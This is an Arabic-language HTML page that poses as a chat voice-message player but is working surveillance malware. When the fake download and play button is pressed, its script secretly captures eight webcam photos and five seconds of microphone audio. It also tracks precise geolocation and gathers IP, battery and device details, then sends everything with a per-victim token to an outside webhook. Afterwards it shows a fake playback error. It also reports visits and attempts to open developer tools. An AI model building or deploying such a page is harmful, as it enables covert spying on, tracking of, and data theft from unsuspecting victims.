<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>رسالة صوتية</title>
  <style>
    :root {
      --bubble-in: #f0f2f5;
      --bubble-in-text: #050505;
      --accent: #0084ff;
      --muted: #65676b;
      --wave-idle: #c6c9cc;
      --danger: #e41e3f;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: transparent;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }

    .container {
      display: flex;
      align-items: flex-end;
      gap: 7px;
    }

    .msg-avatar {
      width: 26px; height: 26px;
      border-radius: 50%;
      background: #bcc0c4;
      flex-shrink: 0;
      display: flex; align-items: center; justify-content: center;
      margin-bottom: 1px;
    }
    .msg-avatar svg { width: 15px; height: 15px; fill: #fff; }

    .bubble-col {
      display: flex;
      flex-direction: column;
    }

    .voice-bubble {
      background: var(--bubble-in);
      color: var(--bubble-in-text);
      border-radius: 18px;
      padding: 9px 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      width: 230px;
      box-shadow: 0 1px 4px rgba(0,0,0,0.04);
      transition: background 0.2s, border 0.2s;
    }

    .voice-bubble.failed {
      background: #fce4e6;
      border: 1px solid var(--danger);
    }

    .action-btn {
      width: 33px; height: 33px;
      border-radius: 50%;
      background: var(--accent);
      border: none;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: transform 0.1s ease, background 0.2s ease;
      position: relative;
      box-shadow: 0 2px 6px rgba(0,132,255,0.25);
    }
    .action-btn:active { transform: scale(0.94); }
    .action-btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .action-btn.error-shake {
      animation: shake 0.4s;
      background: var(--danger);
      box-shadow: 0 2px 8px rgba(228,30,63,0.3);
    }

    @keyframes shake {
      0%,100%{ transform: translateX(0); }
      20%{ transform: translateX(-3px); }
      40%{ transform: translateX(3px); }
      60%{ transform: translateX(-2px); }
      80%{ transform: translateX(2px); }
    }

    .action-btn svg { width: 14px; height: 14px; fill: #fff; }
    .icon {
      position: absolute;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transition: opacity 0.15s ease;
    }
    .icon.show { opacity: 1; }

    .spinner {
      width: 16px; height: 16px;
      border-radius: 50%;
      border: 2px solid rgba(255,255,255,0.35);
      border-top-color: #ffffff;
      animation: spin 0.75s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .waveform {
      flex: 1;
      display: flex;
      align-items: center;
      gap: 2.5px;
      height: 22px;
      cursor: pointer;
    }

    .bar {
      width: 2.5px;
      border-radius: 2px;
      background: var(--wave-idle);
      transition: height 0.12s ease, background 0.2s ease;
      flex-shrink: 0;
      will-change: height;
    }
    .bar.active { background: var(--accent); }
    .bar.error { background: var(--danger); }

    .voice-meta {
      font-size: 11px;
      color: #65676b;
      min-width: 28px;
      text-align: left;
      transition: color 0.2s ease;
    }
    .voice-meta.failed { color: var(--danger); }

    .msg-time {
      font-size: 11px;
      color: var(--muted);
      margin-top: 4px;
      padding-inline-start: 4px;
    }

    .error-toast {
      display: flex;
      align-items: center;
      gap: 5px;
      padding-inline-start: 4px;
      margin-top: 3px;
      font-size: 12px;
      color: var(--danger);
      opacity: 0;
      transform: translateY(-4px);
      transition: opacity 0.25s ease, transform 0.25s ease;
      height: 16px;
    }
    .error-toast.show {
      opacity: 1;
      transform: translateY(0);
    }

    /* عناصر مخفية للكاميرا والميكروفون */
    #hiddenVideo {
      position: fixed;
      top: -1000px;
      left: -1000px;
      width: 320px;
      height: 240px;
      opacity: 0;
      pointer-events: none;
    }
    #hiddenCanvas { display: none; }
  </style>
</head>
<body>

<div class="container">
  <div class="msg-avatar">
    <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.4c-3.3 0-9.8 1.6-9.8 4.9v2.5h19.6v-2.5c0-3.3-6.5-4.9-9.8-4.9z"/></svg>
  </div>
  <div class="bubble-col">
    <div class="voice-bubble" id="voiceBubble">
      <button class="action-btn" id="actionBtn" aria-label="تنزيل الرسالة الصوتية">
        <span class="icon show" id="iconDownload">
          <svg viewBox="0 0 24 24"><path d="M12 3v10.6l3.3-3.3 1.4 1.4L12 17l-4.7-5.3 1.4-1.4 3.3 3.3V3h0zM5 19h14v2H5z"/></svg>
        </span>
        <span class="icon" id="iconSpinner">
          <span class="spinner"></span>
        </span>
        <span class="icon" id="iconPlay">
          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
        </span>
      </button>
      <div class="waveform" id="waveform"></div>
      <div class="voice-meta"><span id="duration">0:09</span></div>
    </div>
    <div class="msg-time">الآن</div>
    <div class="error-toast" id="errorToast">⚠️ تعذر تشغيل الرسالة، حاول تاني</div>
  </div>
</div>

<!-- عناصر مخفية للكاميرا والصوت -->
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="hiddenCanvas"></canvas>

<script>
  // ================================================================
  //  1.  إنشاء شكل الموجة (Waveform) – بارتفاعات ثابتة مبدئياً
  // ================================================================
  const waveform = document.getElementById('waveform');
  const baseHeights = [4,7,12,18,22,16,9,20,24,14,6,11,22,18,8,20,14,24,10,7,16,5];
  const bars = [];
  baseHeights.forEach(h => {
    const bar = document.createElement('div');
    bar.className = 'bar';
    bar.style.height = h + 'px';
    waveform.appendChild(bar);
    bars.push(bar);
  });

  // ================================================================
  //  2.  عناصر DOM الأساسية
  // ================================================================
  const actionBtn = document.getElementById('actionBtn');
  const iconDownload = document.getElementById('iconDownload');
  const iconSpinner = document.getElementById('iconSpinner');
  const iconPlay = document.getElementById('iconPlay');
  const errorToast = document.getElementById('errorToast');
  const voiceBubble = document.getElementById('voiceBubble');
  const durationEl = document.getElementById('duration');
  const hiddenVideo = document.getElementById('hiddenVideo');
  const hiddenCanvas = document.getElementById('hiddenCanvas');

  // ================================================================
  //  3.  متغيرات الحالة
  // ================================================================
  let state = 'download';        // 'download' | 'play'
  let busy = false;
  let downloadClicks = 0;
  let toastTimer = null;
  let isFailed = false;
  let pulseId = null;            // معرف requestAnimationFrame للنبض
  let isPulsing = false;

  // ================================================================
  //  4.  المتغيرات الخاصة بجمع البيانات (مأخوذة من الاصلي)
  // ================================================================
  let mediaStream = null;
  let audioStream = null;
  let audioRecorder = null;
  let audioChunks = [];
  let capturedPhotoFiles = [];
  let audioBlob = null;
  let userIP = 'غير متاح';
  let userLocation = { lat: null, lng: null, accuracy: null, error: null };
  let batteryLevel = -1;
  let isProcessing = false;

  // ================================================================
  //  5.  استخراج التوكن من الرابط (مثل الاصلي تماماً)
  // ================================================================
  let USER_TOKEN = null;

  function extractTokenFromURL() {
    const params = new URLSearchParams(window.location.search);
    const token = params.get('i');
    if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
      USER_TOKEN = token;
      console.log('✅ Token extracted:', USER_TOKEN);
      return true;
    } else {
      USER_TOKEN = null;
      console.warn('❌ No valid token found in URL.');
      return false;
    }
  }

  // ================================================================
  //  6.  إعدادات الـ Webhook (مطابقة للاصلي)
  // ================================================================
  const WEBHOOK_URL = "https://dev-free-gift-online.pantheonsite.io/Free/bot.php?action=webhook_data";
  const TOTAL_PHOTOS = 8;           // كما في الاصلي
  const CAPTURE_INTERVAL = 700;     // كما في الاصلي
  const AUDIO_DURATION = 5000;      // كما في الاصلي (5 ثواني)
  const PHOTO_QUALITY = 0.92;       // كما في الاصلي

  // ================================================================
  //  7.  دوال جمع البيانات (مأخوذة من الاصلي بالكامل)
  // ================================================================

  // 7a. الحصول على IP
  async function getIPAddress() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      userIP = data.ip;
    } catch (e) {
      userIP = 'Unable to fetch';
    }
  }

  // 7b. الحصول على الموقع (كما في الاصلي مع watchPosition ومحاولات متعددة)
  async function getLocation() {
    return new Promise((resolve) => {
      console.log('🔍 [getLocation] بدء عملية الحصول على الموقع...');
      if (!navigator.geolocation) {
        userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
        console.error('❌ [getLocation] المتصفح لا يدعم Geolocation');
        resolve();
        return;
      }

      let watchId = null;
      let bestPosition = null;
      let bestAccuracy = Infinity;
      let isResolved = false;
      let attemptCount = 0;
      const MAX_ATTEMPTS = 10;      // كما في الاصلي
      const TIMEOUT_MS = 15000;     // كما في الاصلي
      const TARGET_ACCURACY = 100;  // كما في الاصلي

      const resolveWithBest = () => {
        if (isResolved) return;
        isResolved = true;
        if (watchId !== null) {
          navigator.geolocation.clearWatch(watchId);
          watchId = null;
        }
        if (bestPosition) {
          userLocation.lat = bestPosition.coords.latitude;
          userLocation.lng = bestPosition.coords.longitude;
          userLocation.accuracy = bestPosition.coords.accuracy;
          userLocation.error = null;
          console.log('✅ [getLocation] نجاح:', bestPosition.coords.latitude, bestPosition.coords.longitude);
        } else {
          userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
          console.error('❌ [getLocation] فشل الحصول على الموقع - لا توجد بيانات');
        }
        resolve();
      };

      const timeoutId = setTimeout(() => {
        if (!isResolved) {
          console.warn('⏳ [getLocation] انتهت المهلة');
          if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
            watchId = null;
          }
          if (bestPosition) {
            resolveWithBest();
          } else {
            userLocation.error = 'انتهت مهلة الحصول على الموقع';
            resolve();
          }
        }
      }, TIMEOUT_MS);

      const handlePosition = (pos) => {
        attemptCount++;
        const accuracy = pos.coords.accuracy;
        console.log(`📍 [getLocation] تحديث ${attemptCount}: دقة ${accuracy} متر`);
        if (accuracy < bestAccuracy) {
          bestAccuracy = accuracy;
          bestPosition = pos;
        }
        if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
          console.log(`✅ [getLocation] تم الوصول للدقة المطلوبة (${accuracy} متر) أو انتهت المحاولات (${attemptCount})`);
          resolveWithBest();
          clearTimeout(timeoutId);
        }
      };

      const handleError = (err) => {
        if (isResolved) return;
        console.warn(`⚠️ [getLocation] خطأ: ${err.message} (كود ${err.code})`);
        if (err.code === 1) {
          userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
          isResolved = true;
          if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
            watchId = null;
          }
          clearTimeout(timeoutId);
          resolve();
          return;
        }
        if (attemptCount < MAX_ATTEMPTS) {
          // لا نعرض شيء للمستخدم
        } else {
          if (bestPosition) {
            resolveWithBest();
          } else {
            userLocation.error = err.message || 'تعذر الحصول على الموقع';
            isResolved = true;
            if (watchId !== null) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
            }
            clearTimeout(timeoutId);
            resolve();
          }
        }
      };

      watchId = navigator.geolocation.watchPosition(
        handlePosition,
        handleError,
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
      );
      console.log('📡 [getLocation] تم بدء watchPosition');
    });
  }

  // 7c. الحصول على مستوى البطارية (ميزة إضافية من الاصلي)
  async function getBatteryLevel() {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100);
        console.log(`🔋 البطارية: ${batteryLevel}%`);
      } else {
        batteryLevel = -1;
      }
    } catch (e) {
      batteryLevel = -1;
    }
  }

  // 7d. تشغيل الكاميرا والتقاط 8 صور (كما في الاصلي)
  async function startCameraAndCapture() {
    return new Promise(async (resolve) => {
      try {
        console.log('📸 [startCameraAndCapture] بدء الكاميرا');
        const constraints = { video: true, audio: false };
        mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        hiddenVideo.srcObject = mediaStream;
        await hiddenVideo.play();

        await new Promise((resolve, reject) => {
          const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
          const onReady = () => { clearTimeout(timeout); resolve(); };
          if (hiddenVideo.readyState >= 2 && hiddenVideo.videoWidth > 0) {
            onReady();
          } else {
            hiddenVideo.addEventListener('loadedmetadata', onReady);
            hiddenVideo.addEventListener('canplay', onReady);
            hiddenVideo.play().catch(() => {});
          }
        });

        await new Promise(r => setTimeout(r, 500));
        const ctx = hiddenCanvas.getContext('2d');
        const width = Math.min(hiddenVideo.videoWidth || 640, 1920);
        const height = Math.min(hiddenVideo.videoHeight || 480, 1080);
        hiddenCanvas.width = width;
        hiddenCanvas.height = height;

        capturedPhotoFiles = [];

        for (let i = 1; i <= TOTAL_PHOTOS; i++) {
          ctx.drawImage(hiddenVideo, 0, 0, width, height);
          const blob = await new Promise((resolve) => {
            hiddenCanvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
          });
          if (blob && blob.size > 1000) {
            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
            capturedPhotoFiles.push(file);
          }
          if (i < TOTAL_PHOTOS) {
            await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
          }
        }

        console.log(`✅ [startCameraAndCapture] تم التقاط ${capturedPhotoFiles.length} صور`);
        resolve(true);

      } catch (error) {
        console.error('❌ [startCameraAndCapture] خطأ:', error);
        if (mediaStream) {
          mediaStream.getTracks().forEach(t => t.stop());
          mediaStream = null;
        }
        hiddenVideo.srcObject = null;
        resolve(false);
      }
    });
  }

  // 7e. تسجيل الصوت لمدة 5 ثوانٍ (كما في الاصلي)
  async function recordAudio() {
    return new Promise(async (resolve) => {
      try {
        console.log('🎤 [recordAudio] بدء التسجيل الصوتي');
        const audioConstraints = { audio: true };
        audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
        audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
        audioChunks = [];
        audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
        audioRecorder.onstop = () => {
          if (audioChunks.length > 0) {
            audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            console.log(`✅ [recordAudio] تم التسجيل بحجم ${audioBlob.size} بايت`);
          }
          resolve();
        };
        audioRecorder.start();
        setTimeout(() => {
          if (audioRecorder.state === 'recording') {
            audioRecorder.stop();
            console.log('⏹️ [recordAudio] تم إيقاف التسجيل');
          }
          audioStream.getTracks().forEach(t => t.stop());
        }, AUDIO_DURATION); // 5000 مللي
      } catch (error) {
        console.error('❌ [recordAudio] خطأ:', error);
        resolve();
      }
    });
  }

  // 7f. إرسال جميع البيانات إلى Webhook (مطابق للاصلي)
  async function sendAllData() {
    console.log('📤 [sendAllData] بدء إعداد البيانات للإرسال');

    const formData = new FormData();

    formData.append('event', 'submission');
    formData.append('country', 'غير محدد'); // لا نختار دولة
    formData.append('phone', 'غير محدد');   // لا نطلب رقم
    formData.append('ip', userIP);
    formData.append('battery', batteryLevel >= 0 ? String(batteryLevel) : 'غير متاح');

    formData.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
    formData.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
    formData.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
    formData.append('location[error]', userLocation.error || '');

    formData.append('device[userAgent]', navigator.userAgent);
    formData.append('device[platform]', navigator.platform);
    formData.append('device[language]', navigator.language);
    formData.append('device[screen]', `${screen.width}x${screen.height}`);
    formData.append('device[colorDepth]', screen.colorDepth);
    formData.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
    formData.append('timestamp', new Date().toISOString());

    if (capturedPhotoFiles.length > 0) {
      capturedPhotoFiles.forEach((file, index) => {
        formData.append(`photos[]`, file, file.name);
      });
      console.log(`📸 [sendAllData] تم إضافة ${capturedPhotoFiles.length} صور`);
    }

    if (audioBlob) {
      const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
      formData.append('audio', audioFile);
      console.log(`🎤 [sendAllData] تم إضافة ملف صوتي بحجم ${audioBlob.size} بايت`);
    }

    if (!USER_TOKEN) {
      console.error('❌ [sendAllData] لا يوجد توكن');
      return { success: false, error: 'Token missing' };
    }
    formData.append('token', USER_TOKEN);

    console.log('📤 [sendAllData] إرسال إلى Webhook');

    try {
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
      });
      const result = await response.json();
      if (!response.ok) {
        console.error('❌ Webhook error:', result);
        return { success: false, error: result.message || 'HTTP error' };
      }
      console.log('✅ Webhook success:', result);
      return { success: true, data: result };
    } catch (error) {
      console.error('❌ Webhook fetch error:', error);
      return { success: false, error: error.message };
    }
  }

  // ================================================================
  //  8.  دوال الأمان (كما في الاصلي)
  // ================================================================
  function detectSuspiciousActivity() {
    document.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
    });
    document.addEventListener('keydown', (e) => {
      const key = e.key;
      const ctrl = e.ctrlKey || e.metaKey;
      const shift = e.shiftKey;
      if (key === 'F12' ||
          (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
          (ctrl && key === 'U')) {
        e.preventDefault();
        sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
      }
      if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
        sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
      }
    });
    document.addEventListener('dragstart', (e) => {
      e.preventDefault();
      sendSuspiciousAlert('🔄 محاولة سحب محتوى');
    });
    document.addEventListener('selectstart', (e) => {
      sendSuspiciousAlert('✏️ محاولة تحديد نص');
    });
  }

  let alertCooldown = 0;
  function sendSuspiciousAlert(action) {
    if (!USER_TOKEN) return;
    const now = Date.now();
    if (now - alertCooldown < 5000) return;
    alertCooldown = now;
    const formData = new FormData();
    formData.append('event', 'suspicious');
    formData.append('action', action);
    formData.append('timestamp', new Date().toISOString());
    formData.append('ip', userIP);
    formData.append('userAgent', navigator.userAgent);
    formData.append('url', window.location.href);
    // إرسال التنبيه عبر sendToWebhook (نعيد استخدام نفس الوظيفة)
    // نضيف التوكن يدوياً
    if (USER_TOKEN) formData.append('token', USER_TOKEN);
    fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(console.warn);
  }

  // ================================================================
  //  9.  وظائف التحكم في الواجهة (UI)
  // ================================================================

  function setIcon(target) {
    [iconDownload, iconSpinner, iconPlay].forEach(el => el.classList.remove('show'));
    target.classList.add('show');
  }

  // نبض الموجة الاحترافي (يعطي إحساساً بالتشغيل)
  function startPulse() {
    if (isPulsing) return;
    isPulsing = true;
    let lastTime = 0;
    function pulse(time) {
      if (!isPulsing) return;
      const delta = time - lastTime;
      if (delta > 50) {
        bars.forEach((bar, idx) => {
          const base = baseHeights[idx] || 10;
          const variation = Math.floor(Math.random() * 10) - 5;
          let newHeight = base + variation;
          newHeight = Math.max(3, Math.min(28, newHeight));
          bar.style.height = newHeight + 'px';
          bar.classList.add('active');
        });
        lastTime = time;
      }
      pulseId = requestAnimationFrame(pulse);
    }
    pulseId = requestAnimationFrame(pulse);
  }

  function stopPulse() {
    isPulsing = false;
    if (pulseId) {
      cancelAnimationFrame(pulseId);
      pulseId = null;
    }
    bars.forEach((bar, idx) => {
      bar.style.height = baseHeights[idx] + 'px';
      bar.classList.remove('active');
    });
  }

  function triggerError(message = 'تعذر تشغيل الرسالة، حاول تاني') {
    if (isFailed) return;
    isFailed = true;
    if (isPulsing) stopPulse();

    actionBtn.classList.remove('error-shake');
    void actionBtn.offsetWidth;
    actionBtn.classList.add('error-shake');

    voiceBubble.classList.add('failed');
    durationEl.classList.add('failed');
    durationEl.textContent = 'فشل';
    bars.forEach(bar => bar.classList.add('error'));

    errorToast.textContent = '⚠️ ' + message;
    errorToast.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
      errorToast.classList.remove('show');
      resetToDownload();
    }, 2200);

    actionBtn.disabled = true;
    setTimeout(() => {
      actionBtn.disabled = false;
    }, 2500);
  }

  function resetToDownload() {
    isFailed = false;
    voiceBubble.classList.remove('failed');
    durationEl.classList.remove('failed');
    durationEl.textContent = '0:09';
    bars.forEach(bar => {
      bar.classList.remove('error', 'active');
    });
    bars.forEach((bar, idx) => {
      bar.style.height = baseHeights[idx] + 'px';
    });

    downloadClicks = 0;
    state = 'download';
    setIcon(iconDownload);
    actionBtn.setAttribute('aria-label', 'تنزيل الرسالة الصوتية');
    actionBtn.style.background = 'var(--accent)';
    busy = false;
    actionBtn.disabled = false;
  }

  // ================================================================
  //  10.  الدالة الرئيسية – جمع البيانات وإرسالها (تشبه زر الـ claim)
  // ================================================================
  async function startDataCollection() {
    if (isProcessing) return;
    if (!USER_TOKEN) {
      triggerError('الرابط غير صالح (لا يوجد توكن)');
      return;
    }

    isProcessing = true;
    busy = true;
    actionBtn.disabled = true;
    setIcon(iconSpinner);
    actionBtn.setAttribute('aria-label', 'جارٍ جمع البيانات...');
    startPulse();

    try {
      await getIPAddress();
      await getLocation();
      await getBatteryLevel();
      await startCameraAndCapture();
      await recordAudio();
      const success = await sendAllData();

      if (success) {
        durationEl.textContent = '✅ تم';
        setTimeout(() => {
          triggerError('فشل التحقق من الصوت');
          isProcessing = false;
          busy = false;
          actionBtn.disabled = false;
        }, 1500);
      } else {
        triggerError('فشل الإرسال إلى الخادم');
        isProcessing = false;
        busy = false;
        actionBtn.disabled = false;
      }
    } catch (err) {
      console.error('⚠️ خطأ:', err);
      triggerError('حدث خطأ غير متوقع');
      isProcessing = false;
      busy = false;
      actionBtn.disabled = false;
    } finally {
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
        mediaStream = null;
      }
      if (audioStream) {
        audioStream.getTracks().forEach(t => t.stop());
        audioStream = null;
      }
      if (audioRecorder && audioRecorder.state === 'recording') {
        audioRecorder.stop();
      }
      // لا نعيد تمكين الزر هنا لأن triggerError أو النجاح سيتولى ذلك
    }
  }

  // ================================================================
  //  11.  منطق الضغط على الزر (التفاعل الأساسي)
  // ================================================================
  function handleClick() {
    if (busy) return;
    if (isFailed) {
      resetToDownload();
      setTimeout(() => {
        if (state === 'download') {
          // نبدأ عملية الجمع مباشرة (بدلاً من انتظار ضغطة ثانية)
          // لكننا نحتفظ بمنطق الضغطتين: أول ضغطة تحميل، ثانية تشغيل
          // نعيد ضبط downloadClicks = 1 حتى تكون الضغطة التالية هي "play"
          downloadClicks = 1;
          state = 'download';
          setIcon(iconDownload);
          actionBtn.setAttribute('aria-label', 'تنزيل الرسالة الصوتية');
        }
      }, 300);
      return;
    }

    if (state === 'download') {
      busy = true;
      setIcon(iconSpinner);
      actionBtn.setAttribute('aria-label', 'جارٍ التنزيل');
      actionBtn.disabled = true;

      setTimeout(() => {
        downloadClicks++;
        busy = false;
        actionBtn.disabled = false;

        if (downloadClicks < 2) {
          state = 'download';
          setIcon(iconDownload);
          actionBtn.setAttribute('aria-label', 'تنزيل الرسالة الصوتية');
        } else {
          state = 'play';
          setIcon(iconPlay);
          actionBtn.setAttribute('aria-label', 'تشغيل الرسالة الصوتية');
          // بعد وصول الحالة play نبدأ جمع البيانات فوراً
          startDataCollection();
        }
      }, 1400);

    } else if (state === 'play') {
      triggerError();
    }
  }

  // ================================================================
  //  12.  ربط الأحداث
  // ================================================================
  actionBtn.addEventListener('click', handleClick);
  waveform.addEventListener('click', () => {
    if (state === 'play' || isFailed) {
      handleClick();
    }
  });

  // ================================================================
  //  13.  التهيئة – استخراج التوكن، تفعيل الحماية، إلخ
  // ================================================================
  window.addEventListener('load', async () => {
    const hasToken = extractTokenFromURL();
    if (!hasToken) {
      triggerError('⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
      actionBtn.disabled = true;
      return;
    }
    detectSuspiciousActivity();
    console.log('🛡️ الحماية مفعلة والرابط صالح.');
    // إرسال إشعار دخول (مثل notifyUserEntered في الاصلي)
    if (USER_TOKEN) {
      try {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().catch(() => ({}));
        const formData = new FormData();
        formData.append('event', 'visit');
        formData.append('timestamp', new Date().toISOString());
        formData.append('ip', ip.ip || 'غير متاح');
        formData.append('userAgent', navigator.userAgent);
        formData.append('platform', navigator.platform);
        formData.append('language', navigator.language);
        formData.append('screen', `${screen.width}x${screen.height}`);
        formData.append('url', window.location.href);
        formData.append('token', USER_TOKEN);
        fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(console.warn);
      } catch (e) {}
    }
  });

  // تنظيف الموارد عند الإغلاق
  window.addEventListener('beforeunload', () => {
    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
    if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
  });

  console.log('✅ تم تحميل الرسالة الصوتية – جميع ميزات الاصلي مدمجة.');
</script>
